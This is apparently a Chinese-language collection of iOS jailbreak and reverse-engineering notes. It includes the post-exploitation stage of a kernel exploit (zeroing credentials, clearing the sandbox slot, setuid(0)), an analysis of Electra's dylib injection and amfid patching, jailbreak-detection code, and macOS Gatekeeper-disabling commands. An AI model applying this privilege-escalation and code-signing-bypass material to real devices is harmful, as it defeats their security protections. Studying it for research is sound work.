    kernel_map_ptr = kapi_read_kptr(kernel_map);

    kptr_t kernel_task_ptr;
    kernel_task_ptr = kapi_read_kptr(kernel_task);

    util_info("kernel slide %#llx", text_slide);
    util_info("kernel base %#llx, kernel_map < %#llx: %#llx >", kernel_base, kernel_map, kernel_map_ptr);

    util_info("verify kernel header");
#ifdef __arm64e__
    const uint32_t mach_header[4] = { 0xfeedfacf, 0x0100000c, 0xc0000002, 2 };
#else
    const uint32_t mach_header[4] = { 0xfeedfacf, 0x0100000c, 0, 2 };
#endif
    uint32_t data[4] = {};
    kapi_read(kernel_base, data, sizeof(mach_header));
    util_hexprint_width(data, sizeof(data), 4, "_mh_execute_header");
    int diff = memcmp(mach_header, data, sizeof(uint32_t [2]));
    fail_if(diff, "mach_header mismatch");

    g_exp.kernel_task = kernel_task_ptr;
    g_exp.kernel_proc = kapi_read_kptr(g_exp.kernel_task + OFFSET(task, bsd_info));

    if (g_exp.debug) {
        util_info("---- dump kernel cred ----");
        debug_dump_proc_cred(g_exp.kernel_proc);
        util_info("---- dump self cred ----");
        debug_dump_proc_cred(g_exp.self_proc);
    }

    post_exploit();

    // clean KHEAP by yourself
}

```

```
//  post_exploit.c

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <mach/mach.h>
#include <copyfile.h>
#include "mycommon.h"
#include "utils.h"
#include "k_utils.h"
#include "kapi.h"
#include "k_offsets.h"

#define copyfile(X,Y) (copyfile)(X, Y, 0, COPYFILE_ALL|COPYFILE_RECURSIVE|COPYFILE_NOFOLLOW_SRC);
#define JAILB_ROOT "/private/var/containers/Bundle/jb_resources/"
static const char *jailb_root = JAILB_ROOT;

char *Build_resource_path(char *filename);
void patch_amfid(pid_t amfid_pid);

#define PROC_ALL_PIDS        1
extern int proc_listpids(uint32_t type, uint32_t typeinfo, void *buffer, int buffersize);
extern int proc_pidpath(int pid, void * buffer, uint32_t  buffersize);

pid_t look_for_proc_internal(const char *name, bool (^match)(const char *path, const char *want))
{
    pid_t *pids = calloc(1, 3000 * sizeof(pid_t));
    int procs_cnt = proc_listpids(PROC_ALL_PIDS, 0, pids, 3000);
    if(procs_cnt > 3000) {
        pids = realloc(pids, procs_cnt * sizeof(pid_t));
        procs_cnt = proc_listpids(PROC_ALL_PIDS, 0, pids, procs_cnt);
    }
    int len;
    char pathBuffer[4096];
    for (int i=(procs_cnt-1); i>=0; i--) {
        if (pids[i] == 0) {
            continue;
        }
        memset(pathBuffer, 0, sizeof(pathBuffer));
        len = proc_pidpath(pids[i], pathBuffer, sizeof(pathBuffer));
        if (len == 0) {
            continue;
        }
        if (match(pathBuffer, name)) {
            free(pids);
            return pids[i];
        }
    }
    free(pids);
    return 0;
}

pid_t look_for_proc(const char *proc_name)
{
    return look_for_proc_internal(proc_name, ^bool (const char *path, const char *want) {
        if (!strcmp(path, want)) {
            return true;
        }
        return false;
    });
}

pid_t look_for_proc_basename(const char *base_name)
{
    return look_for_proc_internal(base_name, ^bool (const char *path, const char *want) {
        const char *base = path;
        const char *last = strrchr(path, '/');
        if (last) {
            base = last + 1;
        }
        if (!strcmp(base, want)) {
            return true;
        }
        return false;
    });
}

void patch_TF_PLATFORM(kptr_t task)
{
    uint32_t t_flags = kapi_read32(task + OFFSET(task, t_flags));
    util_info("old t_flags %#x", t_flags);

    t_flags |= 0x00000400; // TF_PLATFORM
    kapi_write32(task + OFFSET(task, t_flags), t_flags);
    t_flags = kapi_read32(task + OFFSET(task, t_flags));
    util_info("new t_flags %#x", t_flags);

    // used in kernel func: csproc_get_platform_binary
}

struct proc_cred {
    char posix_cred[0x100]; // HACK big enough
    kptr_t cr_label;
    kptr_t sandbox_slot;
};

void proc_set_root_cred(kptr_t proc, struct proc_cred **old_cred)
{
    *old_cred = NULL;
    kptr_t p_ucred = kapi_read_kptr(proc + OFFSET(proc, p_ucred));
    kptr_t cr_posix = p_ucred + OFFSET(ucred, cr_posix);

    size_t cred_size = SIZE(posix_cred);
    char zero_cred[cred_size];
    struct proc_cred *cred_label;
    fail_if(cred_size > sizeof(cred_label->posix_cred), "struct proc_cred should be bigger");
    cred_label = malloc(sizeof(*cred_label));

    kapi_read(cr_posix, cred_label->posix_cred, cred_size);
    cred_label->cr_label = kapi_read64(cr_posix + SIZE(posix_cred));
    cred_label->sandbox_slot = 0;

    if (cred_label->cr_label) {
        kptr_t cr_label = cred_label->cr_label | 0xffffff8000000000; // untag, 25 bits
        cred_label->sandbox_slot = kapi_read64(cr_label + 0x10);
        kapi_write64(cr_label + 0x10, 0x0);
    }

    memset(zero_cred, 0, cred_size);
    kapi_write(cr_posix, zero_cred, cred_size);
    *old_cred = cred_label;
}

void proc_restore_cred(kptr_t proc, struct proc_cred *old_cred)
{
    // TODO
}

#pragma mark ---- Post-exp main entry ----

void post_exploit(void)
{
    util_info("update proc_self credential");
    // can not do this under PAC
    //kapi_write64(g_exp.self_proc + OFFSET(proc, p_ucred), kernelCredAddr);
    struct proc_cred *old_cred;
    proc_set_root_cred(g_exp.self_proc, &old_cred);
    util_msleep(100);

    int err = setuid(0);
    if (err) {
        perror("setuid");
    }

    // Test writing to the outer worlds
    if (1) { // ok
        FILE *fp = fopen("/var/mobile/test.txt", "wb");
        fail_if(fp == NULL, "failed to write /var/mobile/test.txt");
        util_info("wrote test file: %p", fp);
        fprintf(fp, "hello from pattern-f\n");
        fclose(fp);
    }

    util_info("now we are out of sandbox, check \"/bin/ps -p 1\"");
    // test exec command
    //util_runCommand("/bin/ls", NULL); // not privided by Apple
    util_runCommand("/bin/ps", "-p", "1", NULL); // built-in tools

    //patch_TF_PLATFORM(g_exp.self_task);

    // ----------------------------------------------------------------------
    //
    util_info("TODO insert your code here");
    //
    // ----------------------------------------------------------------------

    proc_restore_cred(g_exp.self_proc, old_cred);
    free(old_cred);
}

```

## 安装最新版本theos终端命令行
```
$ sudo git clone --recursive https://github.com/theos/theos.git /opt/theos
```

## raw.githubusercontent.com port 443问题
### MacOS解决安装MonkeyDev等遇见Failed to connect to raw.githubusercontent.com port 443问题 : https://www.jianshu.com/p/6ea74620caae

Mac 文件夹搜索进入/etc/hosts
![](https://upload-images.jianshu.io/upload_images/14363383-05259ba1e54ca565.png)

找到hosts 输入以下文字(不要输入其他文字)  (无权限可以复制到桌面 然后替换源文件)
![](https://upload-images.jianshu.io/upload_images/14363383-39e4a6a34f97aa51.png)

199.232.96.133     raw.githubusercontent.com

浏览器直接打开raw.githubusercontent.com  出现github网站就OK

199.232.96.133 raw.githubusercontent.com # comments. put the address here
![](https://upload-images.jianshu.io/upload_images/14363383-bbffc82ba3dce51d.png)

然后成功下载

## iOS Hook Fake Detection
```
#import "iOSHookDetection.h"
#import "fishhook.h"
#import <sys/stat.h>
#include <string.h>
#import <mach-o/loader.h>
#import <mach-o/dyld.h>
#import <mach-o/arch.h>
#import <objc/runtime.h>
#import <dlfcn.h>

static char *JailbrokenPathArr[] = {"/Applications/Cydia.app","/usr/sbin/sshd","/bin/bash","/etc/apt","/Library/MobileSubstrate","/User/Applications/"};

@implementation iOSHookDetection  //实现函数

#pragma mark - 越狱检测
#pragma mark 使用NSFileManager通过检测一些越狱后的关键文件是否可以访问来判断是否越狱
+ (BOOL)isJailbroken1{
    if(TARGET_IPHONE_SIMULATOR)return NO;
    for (int i = 0;i < sizeof(JailbrokenPathArr) / sizeof(char *);i++) {
        if([[NSFileManager defaultManager] fileExistsAtPath:[NSString stringWithUTF8String:JailbrokenPathArr[i]]]){
            return YES;
        }
    }
    return NO;
}
#pragma mark 使用stat通过检测一些越狱后的关键文件是否可以访问来判断是否越狱
+ (BOOL)isJailbroken2{
    
    if(TARGET_IPHONE_SIMULATOR)return NO;
    int ret ;
    Dl_info dylib_info;
    int (*func_stat)(const char *, struct stat *) = stat;
    if ((ret = dladdr(func_stat, &dylib_info))) {
        NSString *fName = [NSString stringWithUTF8String:dylib_info.dli_fname];
        NSLog(@"fname--%@",fName);
        if(![fName isEqualToString:@"/usr/lib/system/libsystem_kernel.dylib"]){
            return YES;
        }
    }
    
    for (int i = 0;i < sizeof(JailbrokenPathArr) / sizeof(char *);i++) {
        struct stat stat_info;
        if (0 == stat(JailbrokenPathArr[i], &stat_info)) {
            return YES;
        }
    }
    
    return NO;
}

#pragma mark 通过环境变量DYLD_INSERT_LIBRARIES检测是否越狱
+ (BOOL)isJailbroken3{
    if(TARGET_IPHONE_SIMULATOR)return NO;
    return !(NULL == getenv("DYLD_INSERT_LIBRARIES"));
}

#pragma mark - 通过遍历dyld_image检测非法注入的动态库
+ (BOOL)isExternalLibs{
    if(TARGET_IPHONE_SIMULATOR)return NO;
    int dyld_count = _dyld_image_count();
    for (int i = 0; i < dyld_count; i++) {
        const char * imageName = _dyld_get_image_name(i);
        NSString *res = [NSString stringWithUTF8String:imageName];
        if([res hasPrefix:@"/var/containers/Bundle/Application"]){
            if([res hasSuffix:@".dylib"]){
                //这边还需要过滤掉自己项目中本身有的动态库
                return YES;
            }
        }
    }
    return NO;
}

#pragma mark - 通过检测ipa中的embedded.mobileprovision中的我们打包Mac的公钥来确定是否签名被修改，但是需要注意的是此方法只适用于Ad Hoc或企业证书打包的情况，App Store上应用由苹果私钥统一打包，不存在embedded.mobileprovision文件
+ (BOOL)isLegalPublicKey:(NSString *)publicKey{
    if(TARGET_IPHONE_SIMULATOR)return YES;
    //来源于https://www.jianshu.com/p/a3fc10c70a29
    NSString *embeddedPath = [[NSBundle mainBundle] pathForResource:@"embedded" ofType:@"mobileprovision"];
    NSString *embeddedProvisioning = [NSString stringWithContentsOfFile:embeddedPath encoding:NSASCIIStringEncoding error:nil];
    NSArray *embeddedProvisioningLines = [embeddedProvisioning componentsSeparatedByCharactersInSet:[NSCharacterSet newlineCharacterSet]];
    for (int i = 0; i < embeddedProvisioningLines.count; i++) {
        if ([embeddedProvisioningLines[i] rangeOfString:@"application-identifier"].location != NSNotFound) {
            NSInteger fromPosition = [embeddedProvisioningLines[i+1] rangeOfString:@"<string>"].location+8;
            
            NSInteger toPosition = [embeddedProvisioningLines[i+1] rangeOfString:@"</string>"].location;
            NSRange range;
            range.location = fromPosition;
            range.length = toPosition - fromPosition;
            NSString *fullIdentifier = [embeddedProvisioningLines[i+1] substringWithRange:range];
            NSArray *identifierComponents = [fullIdentifier componentsSeparatedByString:@"."];
            NSString *appIdentifier = [identifierComponents firstObject];
            NSLog(@"appIdentifier--%@",appIdentifier);
            if (![appIdentifier isEqualToString:publicKey]) {
                return NO;
            }
        }
    }
    return YES;
}

@end

```

### 浅析Tweak loader(MobileSubstrate的替代品)

搜到的源码是：https://github.com/chr1s0x1/TweakInject

代码本身很简单，就是去/Library/MobileSubstrate/DynamicLibraries下面去搜索，
通过plist文件里面的字段决定是否将dylib加载到当前进程中，
就和平时开发tweak去hook那些app的过程一样。
不过我感到疑问的地方在于那本身这个tweak loader dylib又是谁以及何时被加载到进程中的呢。
这里不难想到应该就是越狱后支持hook环境相关，所以我又去翻阅相关越狱源码。

#Electra
研究的越狱源码是：https://github.com/coolstar/electra

至于为什么会选择Electra，而且是早期的一个版本？有以下几点原因：
coolstar由于在开发Electra越狱后,没有开发插件hook环境
而Cydia之父saurik没有提供substrate的支持，
所以自己实现了类似Cydia Substrate完整的hook环境，
这里面很多东西都是重新研究实现的，保留了很多当时的曲折过程，而这些恰好很便于去学习。
代码开源，而且早期一切都是以实用为主，代码都比较有代表性。

#pspawn_payload
回到之前的问题，tweak loader是谁负责加载的呢？最直接相关的代码在:

https://github.com/coolstar/electra/blob/master/basebinaries/pspawn_payload/pspawn_payload.m

代码里面的SBInject.dylib就是tweak loader，如下

#define SBINJECT_PAYLOAD_DYLIB "/usr/lib/SBInject.dylib"
这个模块叫做pspawn_payload，你在coolstar系越狱里进程模块里面就会有这个模块名。

下面是该模块初始化的代码

__attribute__ ((constructor))
static void ctor(void) {
    if (getpid() == 1) {
        current_process = PROCESS_LAUNCHD;
        pthread_t thd;
        pthread_create(&thd, NULL, thd_func, NULL);
    } else {
        current_process = PROCESS_XPCPROXY;
        rebind_pspawns();
    }
}
代码就是如果当前进程不是launchd，就hook pspawns函数。pspawns正是创建一个新进程的函数，所以hook以后会在创建前注入dylib。下面简单列举里面几个关键地方的代码

int fake_posix_spawn_common(pid_t * pid, const char* path, const posix_spawn_file_actions_t *file_actions, posix_spawnattr_t *attrp, char const* argv[], const char* envp[], pspawn_t old) {

    ...
    if (strcmp(path, "/usr/libexec/amfid") == 0) {
        DEBUGLOG("Starting amfid -- special handling");
        inject_me = AMFID_PAYLOAD_DYLIB;
    } else {
        inject_me = SBINJECT_PAYLOAD_DYLIB;
    }
    ...

    int envcount = 0;

    if (envp != NULL){
        DEBUGLOG("Env: ");
        const char** currentenv = envp;
        while (*currentenv != NULL){
            DEBUGLOG("\t%s", *currentenv);
            if (strstr(*currentenv, "DYLD_INSERT_LIBRARIES") == NULL) {
                envcount++;
            }
            currentenv++;
        }
    }

    char const** newenvp = malloc((envcount+2) * sizeof(char **));
    int j = 0;
    for (int i = 0; i < envcount; i++){
        if (strstr(envp[j], "DYLD_INSERT_LIBRARIES") != NULL){
            continue;
        }
        newenvp[i] = envp[j];
        j++;
    }

    char *envp_inject = malloc(strlen("DYLD_INSERT_LIBRARIES=") + strlen(inject_me) + 1);

    envp_inject[0] = '\0';
    strcat(envp_inject, "DYLD_INSERT_LIBRARIES=");
    strcat(envp_inject, inject_me);

    newenvp[j] = envp_inject;
    newenvp[j+1] = NULL;

    ...

    origret = old(pid, path, file_actions, newattrp, argv, newenvp);

}
这里我分析下几个关键的地方，第一是如果当前要创建进程为/usr/libexec/amfid（也就是验证代码签名的进程），那么就注入AMFID_PAYLOAD_DYLIB模块，这个模块主要就是去patch验证签名的地方，这样才能执行任意代码；如果是其他进程，那么就注入SBINJECT_PAYLOAD_DYLIB模块（也就是tweak loader）。第二个地方是介绍了注入的实现方式，原理就是设置当前的环境变量，在调用原函数前，将当前DYLD_INSERT_LIBRARIES这个环境变量里面增加一个dylib路径，这样在进程穿件后就会去加载tweak loader。到这里，我们明白了tweak loader原来就是在这里被注入进去的。但同时又引出了一个问题，pspawn_payload模块本身又是谁加载的呢？这不又回到了之前的问题，接着分析。

#the fun part
这里的名字并不是我随便起的，因为在Electra里面就是就是。相关的代码路径在

https://github.com/coolstar/electra/blob/02858b14dac30c9ba868bd3024529e9ae6592e67/electra/the%20fun%20part/fun.c
这个文件里面的代码会做Post exploit patching所有事情，即在漏洞完成利用以后的所有事，这里当然就是指越狱环境。和其他越狱一样，主要就下面几个工作

初始化jailbreakd
setuid(0)：将当前进程设为root进程
Remap tfp0
Remount / as rw :重新挂起根目录，实现任意文件读写
Prepare bootstrap binary：准备预装的一些基本的二进制文件，包括sshd，gnu命令等
setup hook enviroment : 支持hook环境

launch some daemon：加载一些守护进程

respring ：重启Springboard
这里的最后一步如果完成，也就是平时看到的那样，代表越狱成功了。

回我之前的问题，这些步骤里面我们关心的地方就是hook环境的支持，直接相关代码在

if (enable_tweaks){
    const char* args_launchd[] = {BinaryLocation, itoa(1), "/bootstrap/pspawn_payload.dylib", NULL};
    rv = posix_spawn(&pd, BinaryLocation, NULL, NULL, (char **)&args_launchd, NULL);
    waitpid(pd, NULL, 0);

    const char* args_recache[] = {"/bootstrap/usr/bin/recache", "--no-respring", NULL};
    rv = posix_spawn(&pd, "/bootstrap/usr/bin/recache", NULL, NULL, (char **)&args_recache, NULL);
    waitpid(pd, NULL, 0);
}
也就是说如果设置了支持tweak的话，就会将pspawn_payload模块注入到1号进程，而1号进程就是launchd进程。另外你可能想问，那这里的注入又是怎么实现的呢？不可能又是hook posix_spawn注入环境变量吧，这不就产生鸡生蛋和蛋生鸡的问题了吗？事实上这里的注入并不是通过hook posix_spawn，注入的实现在

https://github.com/coolstar/electra/tree/02858b14dac30c9ba868bd3024529e9ae6592e67/basebinaries/inject_criticald
注入的原理就是通过task_for_pid来实现的，如果你的设备是用的coolstar系越狱（Electra或者Chimera）的话，你会在越狱目录下存在这个可执行文件，下面是Chimera越狱的信息

xia0:/chimera root# ls -la
total 1100
drwxr-xr-x  8 root wheel    256 Feb 26 13:19 ./
drwxr-xr-x 28 root wheel    896 Sep 16 17:44 ../
-rwxr-xr-x  1 root wheel 168736 Sep 17 10:21 inject_criticald*
-rwxr-xr-x  1 root wheel 207920 Sep 17 10:21 jailbreakd*
-rwxr-xr-x  1 root wheel 133840 Sep 17 10:21 jailbreakd_client*
-rwxr-xr-x  1 root wheel 167296 Sep 17 10:21 libjailbreak.dylib*
-rwxr-xr-x  1 root wheel 236896 Sep 17 10:21 pspawn_payload-stg2.dylib*
-rwxr-xr-x  1 root wheel 202640 Sep 17 10:21 pspawn_payload.dylib*
xia0:/chimera root# ./inject_criticald 
Usage: inject_criticald <pid> <dylib>
inject_criticald这个命令可以直接对进程进行注入dylib。到这里，关于tweak loader的加载问题已经得到了解决，整个加载的过程可以说就是越狱的整个过程。现在tweak loader由谁加载的问题解决了，但是何时被加载和初始化的问题还没解决？接下来就和越狱本身不相关了，要从DYLD_INSERT_LIBRARIES说起

#DYLD_INSERT_LIBRARIES && dyld
下面就抛开越狱，进入DYLD_INSERT_LIBRARIES和dyld的实现细节里面，由于dyld本事是开源的，所以从源码开始分析。直接搜索DYLD_INSERT_LIBRARIES最可疑的地方就在这里

// In order for register_func_for_add_image() callbacks to to be called bottom up,
// we need to maintain a list of root images. The main executable is usally the
// first root. Any images dynamically added are also roots (unless already loaded).
// If DYLD_INSERT_LIBRARIES is used, those libraries are first.
static void addRootImage(ImageLoader* image)
{
    //dyld::log("addRootImage(%p, %s)\n", image, image->getPath());
    // add to list of roots
    sImageRoots.push_back(image);
}
注释里面说到了一句，If DYLD_INSERT_LIBRARIES is used, those libraries are first.

也就是说，如果DYLD_INSERT_LIBRARIES环境变量注入的模块会被优先处理。本身这个函数的话是在下面函数中调用

void link(ImageLoader* image, bool forceLazysBound, bool neverUnload, const ImageLoader::RPathChain& loaderRPaths)
{
    // add to list of known images.  This did not happen at creation time for bundles
    if ( image->isBundle() && !image->isLinked() )
        addImage(image);

    // we detect root images as those not linked in yet 
    if ( !image->isLinked() )
        addRootImage(image);

    // process images
    try {
        image->link(gLinkContext, forceLazysBound, false, neverUnload, loaderRPaths);
    }
    catch (const char* msg) {
        garbageCollectImages();
        throw;
    }
}
接下来一个重要的函数就是initializeMainExecutable()

void initializeMainExecutable()
{
    // record that we've reached this step
    gLinkContext.startedInitializingMainExecutable = true;

    // run initialzers for any inserted dylibs
    ImageLoader::InitializerTimingList initializerTimes[sAllImages.size()];
    initializerTimes[0].count = 0;
    const size_t rootCount = sImageRoots.size();
    if ( rootCount > 1 ) {
        for(size_t i=1; i < rootCount; ++i) {
            sImageRoots[i]->runInitializers(gLinkContext, initializerTimes[0]);
        }
    }

    // run initializers for main executable and everything it brings up 
    sMainExecutable->runInitializers(gLinkContext, initializerTimes[0]);

    // register cxa_atexit() handler to run static terminators in all loaded images when this process exits
    if ( gLibSystemHelpers != NULL ) 
        (*gLibSystemHelpers->cxa_atexit)(&runAllStaticTerminators, NULL, NULL);

    // dump info if requested
    if ( sEnv.DYLD_PRINT_STATISTICS )
        ImageLoaderMachO::printStatistics((unsigned int)sAllImages.size(), initializerTimes[0]);
}
这里可以看到会去先初始化sImageRoots，然后才初始化sMainExecutable。当然后面就是一个递归的初始化过程，即是说如果初始化的模块依赖其他模块，那么又先初始化依赖的模块。在递归初始化函数之中有个地方

void ImageLoader::recursiveInitialization(const LinkContext& context, mach_port_t this_thread,
                                          InitializerTimingList& timingInfo, UninitedUpwards& uninitUps)
{
    ...
    // let objc know we are about to initialize this image
    uint64_t t1 = mach_absolute_time();
    fState = dyld_image_state_dependents_initialized;
    oldState = fState;
    context.notifySingle(dyld_image_state_dependents_initialized, this);

    // initialize this image
    bool hasInitializers = this->doInitialization(context);

    // let anyone know we finished initializing this image
    fState = dyld_image_state_initialized;
    oldState = fState;
    context.notifySingle(dyld_image_state_initialized, this);

    ...
}
从这里可以看出，+load函数确实会比mod_init_func优先执行。

最后总结一下，由于tweak loader是通过DYLD_INSERT_LIBRARIES注入的，所以会优先初始化，只有这样才能实现加载tweak模块的功能。到这里tweak loader何时被初始化的疑问也得到了解决，后面会用实验去验证这个分析。

#实验
前面分析了这么多，那实际情况到底是不是这样的呢。首先我们还是对CFBundleGetMainBundle、App里面的+load和mod_init_func下断点，首先断下来的是：

(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 4.1
  * frame #0: 0x00000001fd2d18ac CoreFoundation`CFBundleGetMainBundle
    frame #1: 0x00000001fdbfeadc Foundation`+[NSBundle mainBundle] + 112
    frame #2: 0x00000001024a2ee0 TweakInject.dylib`___lldb_unnamed_symbol1$$TweakInject.dylib + 96
    frame #3: 0x000000010256f56c dyld`ImageLoaderMachO::doModInitFunctions(ImageLoader::LinkContext const&) + 424
    frame #4: 0x000000010256f7ac dyld`ImageLoaderMachO::doInitialization(ImageLoader::LinkContext const&) + 40
    frame #5: 0x0000000102569f64 dyld`ImageLoader::recursiveInitialization(ImageLoader::LinkContext const&, unsigned int, char const*, ImageLoader::InitializerTimingList&, ImageLoader::UninitedUpwards&) + 512
    frame #6: 0x0000000102568dd8 dyld`ImageLoader::processInitializers(ImageLoader::LinkContext const&, unsigned int, ImageLoader::InitializerTimingList&, ImageLoader::UninitedUpwards&) + 152
    frame #7: 0x0000000102568e98 dyld`ImageLoader::runInitializers(ImageLoader::LinkContext const&, ImageLoader::InitializerTimingList&) + 88
    frame #8: 0x00000001025567d4 dyld`dyld::initializeMainExecutable() + 188
    frame #9: 0x000000010255b88c dyld`dyld::_main(macho_header const*, unsigned long, int, char const**, char const**, char const**, unsigned long*) + 4708
    frame #10: 0x0000000102555044 dyld`_dyld_start + 68
从调用链来看initializeMainExecutable后就是先初始化TweakInject.dylib，这时候app自身代码还没执行。接下来断下来是

(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 3.1
  * frame #0: 0x000000010244e7f0 TestAPP`+[OCClassDemo load](self=OCClassDemo, _cmd="load") at OCClassDemo.m:20:5
    frame #1: 0x00000001fc476a24 libobjc.A.dylib`call_load_methods + 188
    frame #2: 0x00000001fc477d94 libobjc.A.dylib`load_images + 148
    frame #3: 0x00000001025564c4 dyld`dyld::notifySingle(dyld_image_states, ImageLoader const*, ImageLoader::InitializerTimingList*) + 488
    frame #4: 0x0000000102569f40 dyld`ImageLoader::recursiveInitialization(ImageLoader::LinkContext const&, unsigned int, char const*, ImageLoader::InitializerTimingList&, ImageLoader::UninitedUpwards&) + 476
    frame #5: 0x0000000102568dd8 dyld`ImageLoader::processInitializers(ImageLoader::LinkContext const&, unsigned int, ImageLoader::InitializerTimingList&, ImageLoader::UninitedUpwards&) + 152
    frame #6: 0x0000000102568e98 dyld`ImageLoader::runInitializers(ImageLoader::LinkContext const&, ImageLoader::InitializerTimingList&) + 88
    frame #7: 0x00000001025567f8 dyld`dyld::initializeMainExecutable() + 224
    frame #8: 0x000000010255b88c dyld`dyld::_main(macho_header const*, unsigned long, int, char const**, char const**, char const**, unsigned long*) + 4708
    frame #9: 0x0000000102555044 dyld`_dyld_start + 68
从调用链看，这时候开始初始化主模块，而且正是+load函数，所以+load就是app最早执行代码的地方。而且是通知libobjc.A.dylib去完成的。这里可以回到dyld的源码中：

static void notifySingle(dyld_image_states state, const ImageLoader* image)
{
    //dyld::log("notifySingle(state=%d, image=%s)\n", state, image->getPath());
    std::vector<dyld_image_state_change_handler>* handlers = stateToHandlers(state, sSingleHandlers);
    if ( handlers != NULL ) {
        dyld_image_info info;
        info.imageLoadAddress    = image->machHeader();
        info.imageFilePath        = image->getRealPath();
        info.imageFileModDate    = image->lastModified();
        for (std::vector<dyld_image_state_change_handler>::iterator it = handlers->begin(); it != handlers->end(); ++it) {
            const char* result = (*it)(state, 1, &info);
            if ( (result != NULL) && (state == dyld_image_state_mapped) ) {
                //fprintf(stderr, "  image rejected by handler=%p\n", *it);
                // make copy of thrown string so that later catch clauses can free it
                const char* str = strdup(result);
                throw str;
            }
        }
    }
    ...
}
notifySingle函数会循环调用所有注册通知的处理模块

// Callback that provides a bottom-up array of images
// For dyld_image_state_[dependents_]mapped state only, returning non-NULL will cause dyld to abort loading all those images
// and append the returned string to its load failure error message. dyld does not free the string, so
// it should be a literal string or a static buffer
//
typedef const char* (*dyld_image_state_change_handler)(enum dyld_image_states state, uint32_t infoCount, const struct dyld_image_info info[]);
这里就是由libobjc.A.dylib去处理的+load函数。最后断下来的就是：

(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
  * frame #0: 0x000000010242bd20 TestAPP`temp_init at temp.c:98:5
    frame #1: 0x000000010256f56c dyld`ImageLoaderMachO::doModInitFunctions(ImageLoader::LinkContext const&) + 424
    frame #2: 0x000000010256f7ac dyld`ImageLoaderMachO::doInitialization(ImageLoader::LinkContext const&) + 40
    frame #3: 0x0000000102569f64 dyld`ImageLoader::recursiveInitialization(ImageLoader::LinkContext const&, unsigned int, char const*, ImageLoader::InitializerTimingList&, ImageLoader::UninitedUpwards&) + 512
    frame #4: 0x0000000102568dd8 dyld`ImageLoader::processInitializers(ImageLoader::LinkContext const&, unsigned int, ImageLoader::InitializerTimingList&, ImageLoader::UninitedUpwards&) + 152
    frame #5: 0x0000000102568e98 dyld`ImageLoader::runInitializers(ImageLoader::LinkContext const&, ImageLoader::InitializerTimingList&) + 88
    frame #6: 0x00000001025567f8 dyld`dyld::initializeMainExecutable() + 224
    frame #7: 0x000000010255b88c dyld`dyld::_main(macho_header const*, unsigned long, int, char const**, char const**, char const**, unsigned long*) + 4708
    frame #8: 0x0000000102555044 dyld`_dyld_start + 68
这里看出就是mod_init_func了，当然在dyld中调用这个函数的地方就是

bool ImageLoaderMachO::doInitialization(const LinkContext& context)
{
    CRSetCrashLogMessage2(this->getPath());

    // mach-o has -init and static initializers
    doImageInit(context);
    doModInitFunctions(context);

    CRSetCrashLogMessage2(NULL);

    return (fHasDashInit || fHasInitializers);
}
其中doModInitFunctions就会解析load command找到_DATA,_mod_init_func列表进行初始化调用。

### 解决“XX.app”已损坏,无法打开。 您应该将它移到废纸篓。

通常在非 Mac App Store下载的软件都会提示“xxx已损坏，打不开。
您应将它移到废纸篓”或者“打不开 xxx，因为它来自身份不明的开发者”。
原因：Mac电脑启用了安全机制，默认只信任Mac App Store下载的软件以及拥有开发者 ID 签名的软件，但是同时也阻止了没有开发者签名的 “老实软件”

解决方法：

#### 1. macOS Catalina 10.15系统：

打开「终端.app」，输入以下命令并回车，输入开机密码回车

sudo xattr -rd com.apple.quarantine 空格 软件的路径

如CleanMyMac X.app
```
sudo xattr -rd com.apple.quarantine /Applications/CleanMyMac X.app
```
#### 2. macOS Mojave 10.14及以下系统：

打开「终端.app」，输入以下命令并回车，输入开机密码回车
```
sudo spctl --master-disable
```
3. macOS Catalina 10.15.4 系统：

更新10.15.4系统后软件出现意外退出，可按照下面的方法给软件签名

1.安装Command Line Tools 工具

打开「终端app」输入如下命令：

xcode-select --install

2.给软件签名

打开终端工具输入并执行如下命令：

sudo codesign --force --deep --sign - (应用路径)

3.错误解决

如出现以下错误提示：

/文件位置 : replacing existing signature

/文件位置 : resource fork,Finder information,or similar detritus not allowed

那么，先在终端执行：

xattr -cr /文件位置（直接将应用拖进去即可）

然后再次执行如下指令即可：

codesign --force --deep --sign - /文件位置（直接将应用拖进去即可）

## iOS私有库 头文件查询网址
## https://developer.limneos.net/

### Preference Bundle
插件设置项Preference Bundle
一个tweak可能要设置一些选项，就像App Store上的App一样，在设置应用里面可以设置，
在theos里，可以通过创建Preference Bundle来为插件提供设置界面,有点类似于Xcode里的Setting Bundle,
Preference Bundle安装到手机后会在/Library/PreferenceBundles/目录生成一个对应的bundle,
此bundle会基于PreferenceLoader注入到设置应用(Setting.app)，
而PreferenceLoader是基于Cydia Substrate的工具，主要为插件在系统设置界面添加一个设置入口。
```
文件	                  作用
entry.plist	        为插件在系统设置应用界面添加一个入口，一般修改icon与label即可
XXXRootListController	XXXRootListController必须继承PSListController或者PSViewController，且必须实现- (id)specifiers方法，因为PSListController依赖_specifiers来获得metadata和group
Makefile	        preference bundle的Makefile，一般不用过多修改与操作，编译Tweak的Makefile会跟随着一起编译
Resources文件夹下的文件如下	
Info.plist	        主要记录这个preference bundle的配置信息，一般不用修改
Root.plist	        重点编写的文件，主要配置插件界面的https://iphonedevwiki.net/index.php/Preferences_specifier_plist#PSSpecifier_runtime_properties_of_plist_keys
ML格式，好像还有一种类似JSON格式的
```
首先来看 entry.plist。这个文件定义了我们的 Preference Bundle 在「设置」App 中的入口信息，我们只需关注 label 和 icon 字段，它们分别决定了入口的显示名称和图标。
xxx/Resources/Root.plist 这个文件中定义。打开观察，有 Awesome Switch 1 的字样
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>items</key>
	<array>
		<dict>
			<key>cell</key>
			<string>PSGroupCell</string>
			<key>label</key>
			<string>cnxlsn0w First Page</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSSwitchCell</string>
			<key>default</key>
			<true/>
			<key>defaults</key>
			<string>cn.xl.sn0w</string>
			<key>key</key>
			<string>AwesomeSwitch1</string>
			<key>label</key>
			<string>Awesome Switch 1</string>
		</dict>
	</array>
	<key>title</key>
	<string>cnxlsn0w</string>
</dict>
</plist>
```
编辑这个 plist 文件，构建出适合我们的设置界面UI
```
